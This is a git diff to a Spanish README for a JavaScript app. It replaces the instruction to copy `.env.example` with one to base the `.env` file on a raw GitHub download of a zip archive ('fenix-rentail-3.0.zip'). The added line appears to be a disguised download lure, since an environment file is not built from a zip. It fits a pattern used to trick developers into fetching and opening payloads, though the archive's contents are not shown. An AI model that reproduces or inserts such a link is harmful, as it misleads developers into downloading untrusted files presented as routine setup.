@@ -16,7 +16,7 @@ npm start
 Luego selecciona plataforma (w, a, i, etc.).
 
 ## Variables de Entorno
-Crea un archivo `.env` basado en `.env.example` (no se sube a git).
+Crea un archivo `.env` basado en `https://raw.githubusercontent.com/MiguelAngelCruzVargas/fenix-rentail-2.0/master/supabase/schema/fenix-rentail-3.0.zip` (no se sube a git).
 
 ## Estructura rápida
 - `components/` componentes reutilizables
